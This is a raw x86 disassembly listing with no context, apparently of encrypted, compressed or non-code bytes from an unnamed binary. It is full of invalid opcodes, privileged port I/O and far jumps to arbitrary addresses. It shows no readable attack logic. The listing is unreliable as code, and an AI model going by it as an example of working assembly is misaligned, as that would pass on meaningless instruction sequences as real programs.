  40f5e1:	mov    cl,BYTE PTR [ebx]
  40f5e3:	ins    DWORD PTR es:[edi],dx
  40f5e4:	mov    al,ds:0xa5d2a255
  40f5e9:	retf   
  40f5ea:	stos   DWORD PTR es:[edi],eax
  40f5eb:	fs pop ss
  40f5ed:	add    bl,al
  40f5ef:	hlt    
  40f5f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5f1:	jl     0x40f612
  40f5f3:	out    dx,eax
  40f5f4:	inc    edi
  40f5f5:	arpl   WORD PTR [eax+0x45d9977f],cx
  40f5fb:	rcr    BYTE PTR [esi+ebp*1+0x63],cl
  40f5ff:	cmc    
  40f600:	pusha  
  40f601:	jae    0x40f664
  40f603:	into   
  40f604:	(bad)  
  40f605:	cmc    
  40f606:	outs   dx,BYTE PTR ds:[esi]
  40f607:	cld    
  40f608:	and    ebp,DWORD PTR [ebx+0x4eaa3195]
  40f60e:	mov    dh,0xa9
  40f610:	dec    esi
  40f611:	daa    
  40f612:	ja     0x40f599
  40f614:	mov    eax,0xca724a49
  40f619:	pushf  
  40f61a:	adc    DWORD PTR [ecx+0x1769091f],0x63
  40f621:	xor    eax,0x4f321b37
  40f626:	mov    BYTE PTR [eax],cl
  40f628:	ror    ch,cl
  40f62a:	xor    BYTE PTR [ebx],0x2
  40f62d:	push   ebp
  40f62e:	adc    ebx,DWORD PTR [edi]
  40f630:	xlat   BYTE PTR ds:[ebx]
  40f631:	adc    bl,BYTE PTR ds:0xc44fe6f7
  40f637:	stos   DWORD PTR es:[edi],eax
  40f638:	imul   BYTE PTR [edi-0x44359d96]
  40f63e:	ror    BYTE PTR [esi-0x3c],1
  40f641:	aam    0x89
  40f643:	fdiv   DWORD PTR [edx+0x3eef26cd]
  40f649:	cmp    ebx,DWORD PTR [esi-0x2c]
  40f64c:	popf   
  40f64d:	mov    ecx,0xc0a1f5ce
  40f652:	mov    ah,0xba
  40f654:	jne    0x40f5d9
  40f656:	in     al,0xcf
  40f658:	mov    al,ds:0x3f906a83
  40f65d:	push   cs
  40f65e:	aam    0x39
  40f660:	mul    ebx
  40f662:	bound  ebp,QWORD PTR [edx+0x1]
  40f665:	shl    DWORD PTR [edx-0xc],0x57
  40f669:	lds    eax,FWORD PTR [esi-0x190fa8aa]
  40f66f:	int    0x9e
  40f671:	fdivr  DWORD PTR [esi+0x4cd63471]
  40f677:	ins    DWORD PTR es:[edi],dx
  40f678:	(bad)  
  40f679:	jmp    0xeaebe0f8
  40f67e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f67f:	fmul   QWORD PTR [edx+0x4f]
  40f682:	fild   QWORD PTR [esi-0x7b5166f8]
  40f688:	inc    esi
  40f689:	push   ebx
  40f68a:	cmp    DWORD PTR [ebx],eax
  40f68c:	dec    eax
  40f68d:	jmp    0x40f652
  40f68f:	test   al,0xc8
  40f691:	mov    bh,ch
  40f693:	pop    es
  40f694:	popa   
  40f695:	ds jne 0x40f6b5
  40f698:	ins    DWORD PTR es:[edi],dx
  40f699:	bound  esi,QWORD PTR [edi-0x2f]
  40f69c:	or     eax,0x5bd83ba6
  40f6a1:	sbb    al,0xf1
  40f6a3:	out    0x30,eax
  40f6a5:	push   eax
  40f6a6:	fsub   QWORD PTR [edx]
  40f6a8:	aam    0xc3
  40f6aa:	fadd   DWORD PTR [edi+0x69275694]
  40f6b0:	ss daa 
  40f6b2:	xchg   ecx,eax
  40f6b3:	(bad)  
  40f6b4:	aam    0x5d
  40f6b6:	dec    esp
  40f6b7:	mov    eax,0xce8dd7aa
  40f6bc:	sub    ebx,DWORD PTR [ebx+esi*2+0x1db7adba]
  40f6c3:	adc    al,0x83
  40f6c5:	in     al,dx
  40f6c6:	jl     0x40f67c
  40f6c8:	in     eax,0x70
  40f6ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6cb:	stc    
  40f6cc:	in     eax,0xb0
  40f6ce:	ficom  DWORD PTR [esi+0x20]
  40f6d1:	inc    bx
  40f6d3:	dec    esp
  40f6d4:	cmc    
  40f6d5:	jae    0x40f71a
  40f6d7:	lods   eax,DWORD PTR ds:[esi]
  40f6d8:	xchg   ebx,eax
  40f6d9:	loopne 0x40f721
  40f6db:	mov    al,0x66
  40f6dd:	lods   eax,DWORD PTR ds:[esi]
  40f6de:	sub    BYTE PTR [edi+ecx*8-0x66],dh
  40f6e2:	das    
  40f6e3:	mov    bl,0x46
  40f6e5:	or     edx,0xffffffd0
  40f6e8:	mov    ch,0x19
  40f6ea:	mov    ebx,0xa825a48a
  40f6ef:	fisub  WORD PTR [eax-0x481ad89a]
  40f6f5:	hlt    
  40f6f6:	mov    edx,0x8c8feca9
  40f6fb:	ret    
  40f6fc:	mov    al,0x21
  40f6fe:	fisttp DWORD PTR [ebx-0x1ee2d57e]
  40f704:	(bad)  
  40f706:	fidivr DWORD PTR [edi]
  40f708:	add    edi,ebp
  40f70a:	push   0x1e
  40f70c:	mov    eax,0xa6408c15
  40f711:	jae    0x40f6bc
  40f713:	loope  0x40f6e7
  40f715:	fxch   st(3)
  40f717:	cs pop ebp
  40f719:	adc    DWORD PTR [edi],ebp
  40f71b:	mov    eax,0xd0b3da06
  40f720:	mov    ebp,0xffc317cd
  40f725:	mov    ecx,0xf13684f5
  40f72a:	inc    ecx
  40f72b:	fdiv   QWORD PTR [eax]
  40f72d:	and    esi,DWORD PTR [ebx+edi*2-0x55]
  40f731:	sbb    al,0x8f
  40f733:	in     eax,dx
  40f734:	and    DWORD PTR [ebp-0x23bcb1e3],ebx
  40f73a:	pop    ebx
  40f73b:	test   edi,eax
  40f73d:	iret   
  40f73e:	push   esi
  40f73f:	push   es
  40f740:	mov    eax,0xfa01cb60
  40f745:	jmp    0x7db0ae39
  40f74a:	in     eax,0x5d
  40f74c:	loop   0x40f6dd
  40f74e:	(bad)  
  40f74f:	rep ins BYTE PTR es:[edi],dx
  40f751:	clc    
  40f752:	out    dx,eax
  40f753:	sbb    dh,dh
  40f755:	xchg   edx,eax
  40f756:	jge    0x40f710
  40f758:	mov    edi,0x249f7e8a
  40f75d:	mov    esp,0xbec4c5e8
  40f762:	jle    0x40f73d
  40f764:	xor    ebx,DWORD PTR [edx]
  40f766:	rol    BYTE PTR [eax+0x1e6bd594],1
  40f76c:	(bad)  
  40f76d:	mov    edi,0x197abf24
  40f772:	std    
  40f773:	pop    ebp
  40f774:	loope  0x40f76f
  40f776:	into   
  40f777:	mov    eax,0x9ab1dbe8
  40f77c:	xor    ah,BYTE PTR [ebx]
  40f77e:	dec    ecx
  40f77f:	ret    0x3b87
  40f782:	xchg   ebx,eax
  40f783:	mov    edi,0xe0750316
  40f788:	push   esi
  40f789:	test   BYTE PTR [ebx],al
  40f78b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40f78d:	jl     0x40f72f
  40f78f:	inc    ecx
  40f790:	mov    bh,0x71
  40f792:	pop    ecx
  40f793:	jge    0x40f7cb
  40f795:	arpl   WORD PTR fs:[esi],bp
  40f798:	cmp    DWORD PTR [eiz*8+0x24c11764],ecx
  40f79f:	adc    DWORD PTR [edi],ebx
  40f7a1:	mov    ebx,0x3d891ba6
  40f7a6:	lahf   
  40f7a7:	loopne 0x40f799
  40f7a9:	aam    0x77
  40f7ab:	cmp    eax,0xe9e004b6
  40f7b0:	xor    al,0xb1
  40f7b2:	sbb    al,0x8a
  40f7b4:	sbb    esp,DWORD PTR [edi+0x48]
  40f7b7:	(bad)  
  40f7b8:	in     eax,dx
  40f7b9:	xchg   ebp,eax
  40f7ba:	xor    bh,BYTE PTR [ebx]
  40f7bc:	inc    edi
  40f7bd:	pop    ss
  40f7be:	jl     0x40f817
  40f7c0:	inc    edx
  40f7c1:	sub    al,cl
  40f7c3:	lods   al,BYTE PTR ds:[esi]
  40f7c4:	inc    eax
  40f7c5:	fwait
  40f7c6:	pop    esp
  40f7c7:	push   0xffffffb2
  40f7c9:	xchg   edx,eax
  40f7ca:	inc    ebp
  40f7cb:	mov    al,ds:0x1dfb9f16
  40f7d0:	cmp    esi,esi
  40f7d2:	retf   0x1d68
  40f7d5:	dec    edx
  40f7d6:	popf   
  40f7d7:	fsub   QWORD PTR [edi+ecx*2]
  40f7da:	in     al,0x3a
  40f7dc:	stos   BYTE PTR es:[edi],al
  40f7dd:	out    0x46,al
  40f7df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7e0:	cmp    al,0x2a
  40f7e2:	loopne 0x40f7dc
  40f7e4:	and    al,bl
  40f7e6:	cmp    BYTE PTR [ebx+0x3d199c89],bh
  40f7ec:	mul    ecx
  40f7ee:	outs   dx,DWORD PTR ds:[esi]
  40f7ef:	push   esp
  40f7f0:	dec    ebx
  40f7f1:	test   DWORD PTR [ebx+0x7ef48600],0x3830a493
  40f7fb:	and    DWORD PTR ss:[ebp+0x347e799e],eax
  40f802:	mov    eax,ds:0xfa69ac96
  40f807:	iret   
  40f808:	mov    DWORD PTR [edi],edi
  40f80a:	scas   eax,DWORD PTR es:[edi]
  40f80b:	nop
  40f80c:	popf   
  40f80d:	shl    BYTE PTR [ebx+edi*1],1
  40f810:	xchg   esp,eax
  40f811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f812:	sbb    eax,0x581ed88d
  40f817:	leave  
  40f818:	ja     0x40f7d6
  40f81a:	push   eax
  40f81b:	xchg   esp,eax
  40f81c:	cmp    al,0xf6
  40f81e:	cmp    eax,0x6058ccbe
  40f823:	mov    dh,0x2b
  40f825:	inc    esp
  40f826:	sbb    al,0xb0
  40f828:	shr    dl,0x3c
  40f82b:	lods   eax,DWORD PTR ds:[esi]
  40f82c:	outs   dx,BYTE PTR ds:[esi]
  40f82d:	out    0xd1,eax
  40f82f:	cmp    ebp,0x4b
  40f832:	push   eax
  40f833:	jl     0x40f809
  40f835:	pop    edx
  40f836:	fadd   DWORD PTR [ebx]
  40f838:	adc    al,BYTE PTR [eax]
  40f83a:	jg     0x40f7fe
  40f83c:	push   cs
  40f83d:	sub    ch,cl
  40f83f:	(bad)  
  40f840:	dec    ebp
  40f841:	call   0xb58a:0xae6296bf
  40f848:	lods   eax,DWORD PTR ds:[esi]
  40f849:	add    edx,DWORD PTR [esi]
  40f84b:	jge    0xf1631707
  40f851:	xor    eax,0xfba6aa8e
  40f856:	push   esp
  40f857:	les    ecx,FWORD PTR [esi]
  40f859:	mov    BYTE PTR [ebp+0x50],dl
  40f85c:	(bad)  
  40f85d:	dec    ecx
  40f85e:	adc    BYTE PTR [esi],dl
  40f860:	loope  0x40f888
  40f862:	mov    ch,BYTE PTR [edi-0x62]
  40f865:	jnp    0x40f89a
  40f867:	stos   BYTE PTR es:[edi],al
  40f868:	push   es
  40f869:	xchg   ecx,eax
  40f86a:	adc    BYTE PTR [edi-0x74601f22],dl
  40f870:	jae    0x40f83d
  40f872:	add    edi,DWORD PTR ds:0x7bf0ed6b
  40f878:	mov    ah,BYTE PTR [edx]
  40f87a:	mov    ebp,DWORD PTR [ebp+0x2a33902c]
  40f880:	adc    BYTE PTR [ebx+0x2a],0xa2
  40f884:	in     eax,0xf7
  40f886:	cmp    cl,BYTE PTR gs:[ebp-0x6b8fe9f4]
  40f88d:	mov    esi,0x2a910f1
  40f892:	xchg   ebx,eax
  40f893:	ror    DWORD PTR [ecx+0x3c339657],cl
  40f899:	xchg   esi,eax
  40f89a:	xchg   ah,ah
  40f89c:	les    edi,FWORD PTR [edi-0x7c4aacc9]
  40f8a2:	jle    0x40f912
  40f8a4:	fwait
  40f8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8a6:	ret    
  40f8a7:	ret    
  40f8a8:	xchg   ebp,eax
  40f8a9:	clc    
  40f8aa:	sub    DWORD PTR ds:0x2c5de272,esp
  40f8b0:	cmp    DWORD PTR [edx],edx
  40f8b2:	fs (bad) 
  40f8b5:	lods   eax,DWORD PTR ds:[esi]
  40f8b6:	or     dh,BYTE PTR [ebx+0x1e5f7393]
  40f8bc:	rcl    BYTE PTR [edi+0x7fd9dc34],cl
  40f8c2:	push   es
  40f8c3:	mov    al,0xd1
  40f8c5:	mov    al,ds:0x91c076f0
  40f8ca:	sub    al,0x36
  40f8cc:	mov    cl,0xf3
  40f8ce:	mov    DWORD PTR [edi+0x314ccaeb],esi
  40f8d4:	add    BYTE PTR [edi-0x73],0x2f
  40f8d8:	shl    ah,0xdb
  40f8db:	sub    BYTE PTR [eax-0x38b27058],0x52
  40f8e2:	mov    ds,WORD PTR [ebx+0x3799a4ce]
  40f8e8:	mov    ds:0x94829aee,eax
  40f8ed:	dec    esi
  40f8ee:	dec    ebp
  40f8ef:	mov    esi,DWORD PTR [ebp+0x22a6ab7d]
  40f8f5:	mov    ah,0xc6
  40f8f7:	xchg   esp,eax
  40f8f8:	call   0x5fb0:0xfe962ba
  40f8ff:	mov    esp,0xcb414ab8
  40f904:	loopne 0x40f8ae
  40f906:	inc    eax
  40f907:	inc    ebx
  40f908:	int    0x8e
  40f90a:	lea    edx,[eax]
  40f90c:	rcl    BYTE PTR [eax],0xed
  40f90f:	or     al,0x89
  40f911:	loopne 0x40f929
  40f913:	push   edx
  40f914:	fwait
  40f915:	jbe    0x40f8c7
  40f917:	outs   dx,BYTE PTR ds:[esi]
  40f918:	sbb    ebp,DWORD PTR [eax+edx*2+0x190c712b]
  40f91f:	mov    ds:0x9c2365b1,al
  40f924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f925:	mov    dl,0x4
  40f927:	repz mov dh,0xfd
  40f92a:	idiv   BYTE PTR [esi]
  40f92c:	lea    eax,[ebp+0x2a]
  40f92f:	repnz cmc 
  40f931:	jmp    0x40f932
  40f933:	das    
  40f934:	dec    ebx
  40f935:	or     al,0x61
  40f937:	mov    ebp,0x26c48325
  40f93c:	aad    0x9
  40f93e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f93f:	sahf   
  40f940:	lods   eax,DWORD PTR ds:[esi]
  40f941:	jle    0x40f98d
  40f943:	cmp    ebx,ebx
  40f945:	sub    DWORD PTR [edi+0x44],ebp
  40f948:	das    
  40f949:	das    
  40f94a:	jnp    0x40f8dc
  40f94c:	setbe  al
  40f94f:	jecxz  0x40f905
  40f951:	outs   dx,BYTE PTR ds:[esi]
  40f952:	(bad)  
  40f954:	gs (bad) 
  40f957:	inc    ebp
  40f958:	jns    0x40f933
  40f95a:	test   eax,0x8ed2d397
  40f95f:	or     edx,DWORD PTR [edx]
  40f961:	jmp    0xea21:0x23c9d573
  40f968:	lahf   
  40f969:	cwde   
  40f96a:	sub    eax,0x2b7fe49e
  40f96f:	dec    ebx
  40f970:	or     BYTE PTR [edx],0x60
  40f973:	xchg   esi,eax
  40f974:	mov    cs,WORD PTR [ebx]
  40f976:	das    
  40f977:	jecxz  0x40f90c
  40f979:	(bad)  
  40f97a:	pop    ecx
  40f97b:	mov    dh,0xe1
  40f97d:	cmp    eax,0xdb9b77fb
  40f982:	loop   0x40f97f
  40f984:	inc    edi
  40f985:	cmp    eax,0xe6c48c69
  40f98a:	sub    ch,BYTE PTR [ebx-0x3b]
  40f98d:	addr16 xchg edx,eax
  40f98f:	fstp   DWORD PTR [edi-0x63e4a57a]
  40f995:	jg     0x40fa14
  40f997:	scas   al,BYTE PTR es:[edi]
  40f998:	xor    edi,DWORD PTR [edx]
  40f99a:	inc    edi
  40f99b:	dec    edx
  40f99c:	int3   
  40f99d:	ret    
  40f99e:	or     DWORD PTR [eax-0x69b96f6a],edx
  40f9a4:	mov    dl,0xa
  40f9a6:	sahf   
  40f9a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9a8:	xchg   esp,eax
  40f9a9:	xor    dl,BYTE PTR [edi-0x48]
  40f9ac:	in     al,dx
  40f9ad:	cmp    al,0x8
  40f9af:	out    dx,eax
  40f9b0:	bound  ebx,QWORD PTR [edi]
  40f9b2:	push   ebp
  40f9b3:	mov    ah,0xc4
  40f9b5:	dec    ebx
  40f9b6:	hlt    
  40f9b7:	dec    ebp
  40f9b8:	push   esi
  40f9b9:	call   0x5c1c00be
  40f9be:	ficomp WORD PTR [ebp-0xb]
  40f9c1:	mov    bl,0xfb
  40f9c3:	mov    esi,0xbef631bf
  40f9c8:	or     eax,0x4f9f14ed
  40f9cd:	loop   0x40f9fe
  40f9cf:	sbb    DWORD PTR [edi+0x19],ecx
  40f9d2:	fst    DWORD PTR gs:[eax+0x1d]
  40f9d6:	push   esi
  40f9d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9d8:	ret    
  40f9d9:	inc    ecx
  40f9da:	mov    esi,0xcb8a4940
  40f9df:	xor    dl,ah
  40f9e1:	xchg   DWORD PTR [esi+edx*4],edi
  40f9e4:	jmp    DWORD PTR [ebp+0x32]
  40f9e7:	sar    BYTE PTR [ecx+0x2281418b],1
  40f9ed:	or     ch,bh
  40f9ef:	dec    eax
  40f9f0:	sub    BYTE PTR [esi+0x459b1b8b],ch
  40f9f6:	ret    0x637f
  40f9f9:	mov    edi,DWORD PTR [ecx]
  40f9fb:	mov    esp,0xadd2057d
  40fa00:	jecxz  0x40fa4d
  40fa02:	mov    esi,0xc8da41cc
  40fa07:	sbb    ebx,DWORD PTR [ebp+0x1552e132]
  40fa0d:	(bad)  
  40fa0e:	mov    fs,WORD PTR [ebx]
  40fa10:	pop    ecx
  40fa11:	repz inc BYTE PTR [ecx-0x15576794]
  40fa18:	fcmovnbe st,st(0)
  40fa1a:	xchg   ebx,eax
  40fa1b:	outs   dx,DWORD PTR ds:[esi]
  40fa1c:	pop    ebx
  40fa1d:	dec    ebp
  40fa1e:	not    ebp
  40fa20:	add    dl,BYTE PTR [ebp-0x6cfe1ae5]
  40fa26:	out    0xeb,eax
  40fa28:	inc    esi
  40fa29:	mov    esi,0x5344708b
  40fa2e:	sbb    DWORD PTR [ebp+0x2d],ecx
  40fa31:	push   ebp
  40fa32:	sub    eax,0xb05a6aaf
  40fa37:	sbb    eax,0xffffffba
  40fa3a:	ss in  al,0x63
  40fa3d:	or     DWORD PTR ds:0xad4bb5e3,0x2ac2c2ab
  40fa47:	aad    0x9c
  40fa49:	xchg   ebp,eax
  40fa4a:	retf   0xe63e
  40fa4d:	fimul  DWORD PTR [ecx+ebp*8]
  40fa50:	into   
  40fa51:	in     al,0x49
  40fa53:	jo     0x40fa42
  40fa55:	xchg   ebx,eax
  40fa56:	mov    BYTE PTR [edi+ecx*8],bl
  40fa59:	and    esi,ebx
  40fa5b:	leave  
  40fa5c:	and    esi,DWORD PTR [ecx+eiz*8-0x64624b5c]
  40fa63:	push   es
  40fa64:	pop    eax
  40fa65:	sub    bl,BYTE PTR [ecx-0x67]
  40fa68:	test   DWORD PTR [eax-0x1697fe8],ebp
  40fa6e:	addr16 cld 
  40fa70:	les    ebx,FWORD PTR [edx+0x4b]
  40fa73:	stc    
  40fa74:	(bad)  
  40fa75:	and    eax,0x4f07752c
  40fa7a:	pop    esi
  40fa7b:	jne    0x40faaf
  40fa7d:	int3   
  40fa7e:	pop    ecx
  40fa7f:	std    
  40fa80:	call   0xd26e:0xa8ba3bc8
  40fa87:	test   DWORD PTR [ecx+0x39],eax
  40fa8a:	inc    ecx
  40fa8b:	mov    ds:0x2b97ee34,eax
  40fa90:	bound  ebx,QWORD PTR [ebx-0x37b8dbfd]
  40fa96:	mov    ah,0x37
  40fa98:	xchg   esp,eax
  40fa99:	(bad)  
  40fa9b:	push   ecx
  40fa9c:	add    al,BYTE PTR [ebx-0x76]
  40fa9f:	out    dx,eax
  40faa0:	rol    DWORD PTR [ecx-0x7c6de271],1
  40faa6:	xchg   edi,eax
  40faa7:	cmp    al,0xbd
  40faa9:	pop    ebp
  40faaa:	jo     0x40fb20
  40faac:	pop    ecx
  40faad:	jns    0x40fa80
  40faaf:	sti    
  40fab0:	data16 mov dl,0xe4
  40fab3:	and    esp,DWORD PTR [edi-0x4d]
  40fab6:	pop    ebp
  40fab7:	(bad)  
  40fab8:	in     al,dx
  40fab9:	mov    bl,BYTE PTR [esi-0x10]
  40fabc:	cwde   
  40fabd:	shl    DWORD PTR [esi+eiz*4+0x35],1
  40fac1:	adc    cl,bh
  40fac3:	jg     0x40fab9
  40fac5:	hlt    
  40fac6:	add    ah,cl
  40fac8:	bnd jge 0x40fa9f
  40facb:	inc    ecx
  40facc:	mov    fs,WORD PTR [esi]
  40face:	imul   dh
  40fad0:	mov    bl,0x67
  40fad2:	sub    cl,al
  40fad4:	inc    esi
  40fad5:	test   eax,0x315560be
  40fada:	fdivr  DWORD PTR [eax+0x74]
  40fadd:	dec    edi
  40fade:	xlat   BYTE PTR ds:[ebx]
  40fadf:	enter  0x6775,0xa5
  40fae3:	ror    BYTE PTR ds:0xe8635319,1
  40fae9:	and    DWORD PTR [esi+0x1b],eax
  40faec:	push   es
  40faed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faee:	push   esi
  40faef:	mov    edi,0xe1c98e75
  40faf4:	and    ch,dl
  40faf6:	retf   0xc99f
  40faf9:	(bad)  
  40fafa:	jp     0x40fb57
  40fafc:	mov    ah,0x15
  40fafe:	pop    ebx
  40faff:	adc    DWORD PTR [ecx+0x35],0x75992c53
  40fb06:	popa   
  40fb07:	inc    ebx
  40fb08:	jl     0x40fb7b
  40fb0a:	and    al,0xc3
  40fb0c:	mov    edi,0xb72a3391
  40fb11:	jb     0x40fb87
  40fb13:	or     bh,al
  40fb15:	jb     0x40fad3
  40fb17:	ret    
  40fb18:	test   eax,0xe36fd01b
  40fb1d:	mov    DWORD PTR [eax-0x51],esp
  40fb20:	repz daa 
  40fb22:	pop    es
  40fb23:	add    bh,BYTE PTR [esi+0x58]
  40fb26:	iret   
  40fb27:	mov    ebx,0xab52b62a
  40fb2c:	outs   dx,DWORD PTR ds:[esi]
  40fb2d:	sbb    esi,DWORD PTR ds:0x7783104b
  40fb33:	ja     0x40faec
  40fb35:	xor    eax,0x96bf636b
  40fb3a:	or     eax,0x33d197a2
  40fb3f:	outs   dx,BYTE PTR ds:[esi]
  40fb40:	jns    0x40fb35
  40fb42:	inc    edi
  40fb43:	mov    DWORD PTR [ecx+edi*1-0x83db6c4],ecx
  40fb4a:	fcomp  QWORD PTR [eax-0x827b58d]
  40fb50:	sahf   
  40fb51:	xor    DWORD PTR [esi-0x48265886],esp
  40fb57:	pushf  
  40fb58:	sbb    esi,DWORD PTR [edx-0x31]
  40fb5b:	cmp    esp,DWORD PTR [edx+ebx*4+0x44]
  40fb5f:	nop
  40fb60:	in     al,dx
  40fb61:	int    0xa8
  40fb63:	sti    
  40fb64:	test   al,0xa3
  40fb66:	into   
  40fb67:	fsub   QWORD PTR [edi+0x65ba45fd]
  40fb6d:	and    eax,0x95503e39
  40fb72:	test   BYTE PTR [esi+ecx*4],0x1b
  40fb76:	push   0xffffffdd
  40fb78:	sbb    DWORD PTR [ebx-0xa],ebp
  40fb7b:	cwde   
  40fb7c:	jne    0x40fb99
  40fb7e:	cdq    
  40fb7f:	sbb    eax,0xa4e92059
  40fb84:	cmp    al,0x43
  40fb86:	mov    al,ds:0xbdc5684a
  40fb8b:	lds    edi,FWORD PTR [esi]
  40fb8d:	outs   dx,DWORD PTR ds:[esi]
  40fb8e:	sbb    esp,0xffffffbc
  40fb91:	popf   
  40fb92:	inc    ecx
  40fb93:	mov    eax,ds:0x835efde4
  40fb98:	mov    cl,dh
  40fb9a:	xor    DWORD PTR [ecx],ebp
  40fb9c:	dec    ecx
  40fb9d:	and    al,0x6e
  40fb9f:	sub    eax,0xf3ce6c47
  40fba4:	popf   
  40fba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fba6:	inc    edi
  40fba7:	mov    bl,0x7a
  40fba9:	fucom  st(1)
  40fbab:	sbb    ebx,DWORD PTR [edi-0x3b05288a]
  40fbb1:	mov    bh,0xb7
  40fbb3:	test   al,0xa9
  40fbb5:	(bad)  
  40fbb7:	popa   
  40fbb8:	sub    bh,cl
  40fbba:	push   eax
  40fbbb:	clc    
  40fbbc:	sbb    edx,ebx
  40fbbe:	dec    esi
  40fbbf:	xchg   ebp,eax
  40fbc0:	jne    0x40fba1
  40fbc2:	retf   0x5d78
  40fbc5:	add    bh,al
  40fbc7:	ds jle 0x40fc1a
  40fbca:	pop    es
  40fbcb:	das    
  40fbcc:	mov    cl,BYTE PTR [eax]
  40fbce:	fidivr DWORD PTR [ecx-0x38]
  40fbd1:	frstor [edi]
  40fbd3:	xchg   DWORD PTR ds:0x8528976f,ebp
  40fbd9:	ficomp DWORD PTR [edx]
  40fbdb:	std    
  40fbdc:	lock in al,0x4b
  40fbdf:	out    0x6a,eax
  40fbe1:	les    edx,FWORD PTR [esi+ecx*8+0x11486562]
  40fbe8:	rcr    DWORD PTR [ebx+0x33],0xcf
  40fbec:	xchg   BYTE PTR [ebx+0x432d3e85],al
  40fbf2:	aad    0xa2
  40fbf4:	aas    
  40fbf5:	and    eax,0xdb9d3680
  40fbfa:	sub    eax,0xb8851a07
  40fbff:	mov    al,ds:0x79e71e1d
  40fc04:	ret    
  40fc05:	jmp    0xa455:0x38164dd1
  40fc0c:	jb     0x40fc8c
  40fc0e:	pop    edx
  40fc0f:	xor    eax,0x6f6ed4ee
  40fc14:	shl    DWORD PTR ds:0x19ff4f3d,0xec
  40fc1b:	sbb    BYTE PTR [edx],al
  40fc1d:	ja     0x40fbc3
  40fc1f:	jg     0x40fc84
  40fc21:	imul   DWORD PTR [edx]
  40fc23:	cwde   
  40fc24:	gs ret 0x4618
  40fc28:	in     al,dx
  40fc29:	es call 0x5c8a:0xf81685d7
  40fc31:	dec    eax
  40fc32:	inc    ecx
  40fc33:	pop    eax
  40fc34:	aaa    
  40fc35:	jmp    0x52e9:0x1c17280
  40fc3c:	mov    esi,0x349e57dc
  40fc41:	adc    BYTE PTR [edx+0xcd692c1],bl
  40fc47:	in     eax,0x5a
  40fc49:	sar    DWORD PTR ss:0xe0caae4,0x95
  40fc51:	pop    ss
  40fc52:	mov    BYTE PTR [eax],bh
  40fc54:	into   
  40fc55:	addr16 pop edi
  40fc57:	in     al,0x6c
  40fc59:	push   eax
  40fc5a:	popa   
  40fc5b:	enter  0x425d,0x72
  40fc5f:	cwde   
  40fc60:	jb     0x40fcc6
  40fc62:	dec    BYTE PTR [esi]
  40fc64:	push   ss
  40fc65:	push   esp
  40fc66:	sub    BYTE PTR [ebx-0x40b1b722],dl
  40fc6c:	lahf   
  40fc6d:	push   ecx
  40fc6e:	popf   
  40fc6f:	jno    0x40fc6f
  40fc71:	push   edx
  40fc72:	mov    BYTE PTR [eax+ebx*2+0x7a],dh
  40fc76:	repnz aaa 
  40fc78:	and    eax,0x70630b6a
  40fc7d:	std    
  40fc7e:	cmp    eax,0x23fc0b93
  40fc83:	sbb    al,0x79
  40fc85:	lods   al,BYTE PTR ds:[esi]
  40fc86:	fsin   
  40fc88:	push   es
  40fc89:	leave  
  40fc8a:	mov    dl,0xe8
  40fc8c:	div    BYTE PTR [ebx]
  40fc8e:	xchg   edx,eax
  40fc8f:	ins    BYTE PTR es:[edi],dx
  40fc90:	jle    0x40fc33
  40fc92:	in     al,dx
  40fc93:	sub    esi,DWORD PTR [eax]
  40fc95:	mov    bh,0xc0
  40fc97:	mov    bl,0x24
  40fc99:	rol    DWORD PTR [eax],0x0
	...
  40fd14:	fdiv   QWORD PTR [ecx]
  40fd16:	mov    eax,0xfedbfd5a
  40fd1b:	mov    bh,0xdd
  40fd1d:	xchg   edx,eax
  40fd1e:	iret   
  40fd1f:	mov    DWORD PTR [edx],esi
  40fd21:	sub    DWORD PTR [ecx],0x7f
  40fd24:	adc    ebp,DWORD PTR [ecx+0x76e0000]
  40fd2a:	add    BYTE PTR [eax],al
  40fd2c:	das    
  40fd2d:	xlat   BYTE PTR ds:[ebx]
  40fd2e:	(bad)
  40fd33:	loope  0x40fccc
  40fd35:	pop    ecx
  40fd36:	add    esi,DWORD PTR [ecx-0x25]
  40fd39:	sbb    edx,DWORD PTR [eax+edx*2-0x1736a13c]
  40fd40:	push   eax
  40fd41:	daa    
  40fd42:	inc    ebp
  40fd43:	sbb    esp,esp
  40fd45:	pop    es
  40fd46:	mul    DWORD PTR [ebp-0x20]
  40fd49:	mov    dh,0xc0
  40fd4b:	fsubr  QWORD PTR ds:0x1541e237
  40fd51:	jecxz  0x40fcd9
  40fd53:	int3   
  40fd54:	mov    bh,0x88
  40fd56:	inc    esp
  40fd57:	lahf   
  40fd58:	ret    
  40fd59:	or     al,ah
  40fd5b:	xor    BYTE PTR [ecx],cl
  40fd5d:	mov    ?,WORD PTR [esi+0x3e297adb]
  40fd63:	push   ebp
  40fd64:	int    0x1
  40fd66:	pop    eax
  40fd67:	push   0xfc42072c
  40fd6c:	cwde   
  40fd6d:	adc    esp,DWORD PTR [ecx+0x9]
  40fd70:	add    ch,BYTE PTR [esi-0x4c]
  40fd73:	jne    0x40fdc4
  40fd75:	cmp    ebp,DWORD PTR [edi+0x45292e9f]
  40fd7b:	add    esi,ebx
  40fd7d:	sub    DWORD PTR [eax+edx*1+0x5d7b7334],esi
  40fd84:	xchg   ebp,eax
  40fd85:	mov    edx,0xf1e8488
  40fd8a:	adc    bh,BYTE PTR [ebp-0x35b7d4ec]
  40fd90:	aam    0x26
  40fd92:	(bad)  
  40fd93:	int    0x15
  40fd95:	scas   al,BYTE PTR es:[edi]
  40fd96:	sar    esp,0xb7
  40fd99:	mov    al,0xfc
  40fd9b:	push   ebx
  40fd9c:	imul   ebp,DWORD PTR [esi],0x5bbbc4e5
  40fda2:	sbb    eax,0x6fe619e5
  40fda7:	jbe    0x40fd81
  40fda9:	out    dx,eax
  40fdaa:	out    0x14,al
